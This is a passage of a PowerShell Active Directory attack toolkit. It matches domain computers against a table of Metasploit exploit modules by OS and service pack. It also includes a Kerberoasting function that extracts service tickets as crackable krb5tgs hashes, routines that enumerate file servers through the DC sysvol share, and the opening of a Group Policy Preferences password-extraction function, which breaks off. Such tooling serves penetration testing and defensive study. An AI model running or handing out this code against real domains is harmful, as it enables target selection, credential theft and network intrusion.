        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  

        # Create data table to house vulnerable server list
        $TableVulnComputers = New-Object System.Data.DataTable 
        $TableVulnComputers.Columns.Add('ComputerName') | Out-Null
        $TableVulnComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableVulnComputers.Columns.Add('ServicePack') | Out-Null
        $TableVulnComputers.Columns.Add('LastLogon') | Out-Null
        $TableVulnComputers.Columns.Add('MsfModule') | Out-Null  
        $TableVulnComputers.Columns.Add('CVE') | Out-Null   
        
        # Iterate through each exploit
        $TableExploits | 
        ForEach-Object {
                     
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE

            # Iterate through each ADS computer
            $TableAdsComputers | 
            ForEach-Object {
                
                $AdsHostname = $_.Hostname
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.ServicePack                                                        
                $AdsLast = $_.LastLogon
                
                # Add exploitable systems to vul computers data table
                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ){                    
                   
                    # Add domain computer to data table                    
                    $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve) | Out-Null 
                }

            }

        }     
        

        # Check for vulnerable servers
        $VulnComputer = $TableVulnComputers | select ComputerName -Unique | measure
        $vulnComputerCount = $VulnComputer.Count
        If ($VulnComputer.Count -gt 0){

            Write-Verbose "$vulnComputerCount potentially exploitable systems found."
            Return $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending

        }else{

            Write-Verbose "0 potentially exploitable domain systems were found."

        }      

    }

    End
    {

    }
}


# -------------------------------------------
# Function: Get-DomainSpn
# -------------------------------------------
# Reference: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainSpn
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Computer name to filter on.")]
        [string]$ComputerName,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="User name to filter on.")]
        [string]$User
    )

    Begin
    {
        Write-Verbose "Getting domain SPNs..."

        # Setup table to store results
        $TableDomainSpn = New-Object System.Data.DataTable
        $TableDomainSpn.Columns.Add('UserSid') | Out-Null
        $TableDomainSpn.Columns.Add('User') | Out-Null
        $TableDomainSpn.Columns.Add('UserCn') | Out-Null
        $TableDomainSpn.Columns.Add('Service') | Out-Null
        $TableDomainSpn.Columns.Add('ComputerName') | Out-Null
        $TableDomainSpn.Columns.Add('Spn') | Out-Null
        $TableDomainSpn.Columns.Add('LastLogon') | Out-Null
        $TableDomainSpn.Columns.Add('Description') | Out-Null
        $TableDomainSpn.Clear()
    }

    Process
    {

        try
        {
            # Setup LDAP filter
            $SpnFilter = ""

            if($User){
                $SpnFilter = "(objectcategory=person)(SamAccountName=$User)"
            }

            if($ComputerName){
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=*)$SpnFilter)" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''
                $Spn = $_.properties.serviceprincipalname.split(",")
                           
                foreach ($item in $Spn)
                {
                    # Parse SPNs
                    $SpnServer =  $item.split("/")[1].split(":")[0].split(' ')[0]
                    $SpnService =  $item.split("/")[0]

                    # Add results to table
                    $TableDomainSpn.Rows.Add(
                    [string]$SidString,
                    [string]$_.properties.samaccountname,
                    [string]$_.properties.cn,
                    [string]$SpnService,
                    [string]$SpnServer, 
                    [string]$item,
                    [string]$_.properties.lastlogon,
                    [string]$_.properties.description
                 ) | Out-Null
                }
             }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            Write-Verbose "$TableDomainSpnCount SPNs were found that matched the search."
            Return $TableDomainSpn 
        }else{
            Write-Verbose "0 SPNs were found that matched the search."
        }
    }
}

# -------------------------------------------
# Function: Get-SpnTicket
# -------------------------------------------
# Taken from https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1. Request-SPNTicket/Invoke-Kerberoast.
# Credit to Will Schroeder (@harmj0y).
function Get-SpnTicket
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="User name to filter on.")]
        [string]$User
    )

    Begin
    {
        Add-Type -AssemblyName System.IdentityModel

        Write-Verbose "Getting domain tickets..."

        # Setup table to store results
        $TableDomainTickets = New-Object System.Data.DataTable
        $TableDomainTickets.Columns.Add('UserSid') | Out-Null
        $TableDomainTickets.Columns.Add('User') | Out-Null
        $TableDomainTickets.Columns.Add('Spn') | Out-Null
        $TableDomainTickets.Columns.Add('Ticket') | Out-Null
        $TableDomainTickets.Clear()

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        try
        {
            [string]$DomainDN = [string]$ObjDomain.distinguishedName -replace "DC=","" -replace ",","."

            # Setup LDAP filter
            $SpnFilter = ""

            if($User){
                $SpnFilter = "(objectcategory=person)(SamAccountName=$User)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=*)$SpnFilter)" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''
                $Spn = $_.properties.serviceprincipalname.split(",")
                           
                foreach ($item in $Spn)
                {
                    Write-Verbose "Requesting ticket for: $item"
                    $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $item
                    $TicketByteStream = $Ticket.GetRequest()
                    if ($TicketByteStream) {
                        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                        [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
                        $Parts.RemoveAt($Parts.Count - 1)
                        $Hash = $Parts -join 'A48201'
                        $Hash = $Hash.Insert(32, '$')

                        [string]$SamAccountName = $_.properties.samaccountname
                        #TODO: check hashcat format
                        #$HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$DomainDN`$$($Ticket.ServicePrincipalName)*`$$Hash"
                        $HashFormat = "`$krb5tgs`$23`$*$SamAccountName$DomainDN`$$($Ticket.ServicePrincipalName)*`$$Hash"

                        # Add results to table
                        $TableDomainTickets.Rows.Add(
                        [string]$SidString,
                        [string]$_.properties.samaccountname,
                        [string]$item,
                        [string]$HashFormat
                        ) | Out-Null
                    }
                }
            }

        }
        catch {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
            }
    }

    End
    {
        # Check for results
        if ($TableDomainTickets.Rows.Count -gt 0)
        {
            $TableDomainTicketCount = $TableDomainTickets.Rows.Count
            Write-Verbose "$TableDomainTicketCount tickets were found that matched the search."
            Return $TableDomainTickets
        }else{
            Write-Verbose "0 tickets were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainComputerDFS
# -------------------------------------------
# Ref: https://github.com/PowerShellEmpire/PowerTools/pull/51/files
function Get-DomainComputerDFS
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )
    Begin
    {
        Write-Verbose "Getting domain file servers from DFS LDAP queries..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        try
        {        
            # Setup table for DFS server information
            $TableDFSServers = New-Object System.Data.DataTable
            $TableDFSServers.Columns.Add('name') | Out-Null 
            $TableDFSServers.Columns.Add('remoteservername') | Out-Null  
            $TableDFSServers.Clear()            
            
            # Setup LDAP filter        
            $CompFilter = "(&(objectClass=fTDfs))"
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = "Subtree"

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }

            # Add DFS servers to the table
            $ObjSearcher.FindAll() | ForEach-Object {        
                $_.properties.name                  
                $_.properties.remoteservername

                $TableDFSServers.Rows.Add( 
                    [string]$_.properties.name,                
                    [string]$_.properties.remoteservername             
                 ) | Out-Null               
            }
               
            # Check for DFS servers
            if($TableDFSServers.Rows.Count -gt 0)
            {
                Return $TableDFSServers            
            }else{
                #Write-Verbose "No DFS servers found."
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                       
    }

    End
    {

    }
}


# -------------------------------------------
# Function: Get-DomainComputerFS
# -------------------------------------------
# Note: Need to fix recursion
function Get-DomainComputerFS
{    
    [CmdletBinding(DefaultParametersetName="Default")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting domain file servers..."

        # Create PS Credential object
        if($Password)
        {            
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {        
        
        # Setup data table to store file servers        
        $TableFileServers = New-Object System.Data.DataTable 
        $TableFileServers.Columns.Add('ComputerName') | Out-Null
        $TableFileServers.Columns.Add('SharePath') | Out-Null
        $TableFileServers.Columns.Add('ShareDrive') | Out-Null
        $TableFileServers.Columns.Add('ShareLabel') | Out-Null
        $TableFileServers.Columns.Add('Source') | Out-Null
        $TableFileServers.Clear()

        # ----------------------------------------------------------------
        # Enumerate Domain File Servers via LDAP User Properties
        # ----------------------------------------------------------------        
        try
        {                
        
            # Status user        
            Write-Verbose "Getting domain file servers from the HomeDirectory, ScriptPath, and ProfilePath LDAP user properties..."

            $SAMAccountFilter = "(sAMAccountType=805306368)"
        
            # Search parameters
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = "(&(objectCategory=Person))"
            $ObjSearcher.SearchScope = $SearchScope

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }
        
            # Add fileservers from scriptpath property 
            $ObjSearcher.FindAll() | ForEach-Object {      
            
                # Check ScriptPath Property          
                if ($_.properties.scriptpath){           
                    [string]$ScriptFileServer = $_.properties.scriptpath.split("\\")[2];
                    [string]$ScriptSharePath =  $_.properties.scriptpath
              
                    $TableFileServers.Rows.Add($ScriptFileServer,$ScriptSharePath,"","","ScriptPath") | Out-Null
                }

                # Check HomeDirectory Property
                if ($_.properties.homedirectory){           
                    [string]$HomeFileServer = $_.properties.homedirectory.split("\\")[2];
                    [string]$HomeSharePath =  $_.properties.homedirectory
                    [string]$HomeDrive = $_.properties.homedrive
                
                    if ($HomeDrive) {
                        $HomeShareDrive = $HomeDrive
                    }else{
                        $HomeShareDrive = ""
                    }
                              
                    $TableFileServers.Rows.Add($HomeFileServer,$HomeSharePath,$HomeShareDrive,"","HomeDirectory") | Out-Null
                }

                # Check ProfilePath Property
                if ($_.properties.profilepath){           
                    [string]$ScriptFileServer = $_.properties.profilepath.split("\\")[2];
                    [string]$ScriptSharePath =  $_.properties.profilepath
              
                    $TableFileServers.Rows.Add($ScriptFileServer,$ScriptSharePath,"","","ProfilePath") | Out-Null
                }
            }                    
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }


        # ----------------------------------------------------------------
        # Enumerate Domain File Servers via LDAP Computer Properties - DFS
        # ----------------------------------------------------------------
        try
        {
            # Get list of DFS servers
            $TableDFSServers = Get-DomainComputerDFS -username $username -password $password -DomainController $DomainController
            if($TableDFSServers.Rows.Count -gt 0)
            {
                # Add DFS servers to file server table
                $TableDFSServers | 
                ForEach-Object {                                
                    $TableFileServers.Rows.Add($_.remoteservername,$_.name,"","","DFS") | Out-Null
                }         
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
        
        
        # ----------------------------------------------------------------
        # Enumerate Domain File Servers via Drives.xml on DC sysvol share
        # ----------------------------------------------------------------
        # Note: figure out how to auth to the smb share using unc path without havin to mount the share
        try
        {                    

            # Grab DC
            if($DomainController){
                $TargetDC = "\\$DomainController"
            }else{
                $TargetDC = $env:LOGONSERVER
            }            

            # Create randomish name for dynamic mount point etc
            $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
            $result += $set | Get-Random -Count 10
            $DriveName = [String]::Join("",$result)             
            $DrivePath = "$TargetDC\sysvol" 
            
            # Status user                    
            Write-Verbose "Getting domain file servers from Drives.xml files on $DrivePath..."               

            # Map a temp drive to the DC       
            Write-Verbose "Creating temp share $DriveName to $DrivePath..."
            If ($Credential.UserName){                                
                New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential | Out-Null
            }else{                
                New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null
            }

            # Create temp drive variables
            $TempDrive = $DriveName+":"
            cd $TempDrive  
        
            # Get a list of drives.xml files from the dc
            $TableDrivefiles = New-Object System.Data.DataTable 
            $TableDrivefiles.Columns.Add('FullName') | Out-Null
            $GpoDomain = Get-ChildItem $DrivePath | Select-Object name -First 1 -ExpandProperty name
            $GpoPath = "$DrivePath\$GpoDomain\Policies"
            Get-ChildItem $GpoPath | Select-Object fullname -ExpandProperty fullname |
            ForEach-Object {
                $DrivesBase = $_
                $DrivesPath = "$DrivesBase\User\Preferences\Drives\Drives.xml"
                if(Test-Path $DrivesPath -ErrorAction SilentlyContinue)
                {
                    $TableDrivefiles.Rows.Add($DrivesPath) | Out-Null
                }
            }
        
            # Parse identified Drives.xml files
            $TableDrivefiles | 
            ForEach-Object {
                [string]$DriveFile = $_.FullName
                [xml]$XmlFile = Get-Content $Drivefile
                [string]$FileServer = $xmlfile| Select-xml "/Drives/Drive/Properties/@path" | Select-object -expand node | ForEach-Object {$_.Value.split("\\")[2];}             
                [string]$SharePath = $xmlfile| Select-xml "/Drives/Drive/Properties/@path" | Select-object -expand node | ForEach-Object {$_.Value}             
                [string]$ShareDrive = $xmlfile| Select-xml "/Drives/Drive/@name" | Select-object -expand node | ForEach-Object {$_.Value} 
                [string]$ShareLabel = $xmlfile| Select-xml "/Drives/Drive/Properties/@label" | Select-object -expand node | ForEach-Object {$_.Value}
                        
                $TableFileServers.Rows.Add($FileServer,$SharePath,$ShareDrive,$ShareLabel,"Drives.xml") | Out-Null            
            } 

            # Remove temp drive               
            Write-Verbose "Removing temp share $DriveName to $DrivePath......"         
            cd C:
            Remove-PSDrive $DriveName         
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
                
        
        # Check for file servers
        $TableFileServersCount = $TableFileServers | Where-Object {$_.ComputerName -like "*.*"} | Select-Object ComputerName | Sort-Object ComputerName -Unique | Measure-Object | Select-Object Count -ExpandProperty Count
        if ($TableFileServersCount -gt 0)
        {
            $TableFileServersRows = $TableFileServers.Rows.Count 
            Write-Verbose "$TableFileServersCount domain file servers and $TableFileServersRows shares found."    
            Return $TableFileServers 
        }else{
            Write-Verbose "0 domain file servers found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainPasswordsGPP
# -------------------------------------------
#Usage: Get-DomainPasswordsGPP 
#Usage: Get-DomainPasswordsGPP -Verbose
#Usage: Get-DomainPasswordsGPP -Verbose -DomainController IP -useranme domain\user -password 'passwordhere'
#Most of the code here is based on the Get-GPPPassword function written by Chris Campbell (@obscuresec).
#https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
#Updated from standalone Get-DomainPasswordsGPP script

function Get-DomainPasswordsGPP
{
    [CmdletBinding(DefaultParametersetName="Default")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,
        
        [Parameter(Mandatory=$false,
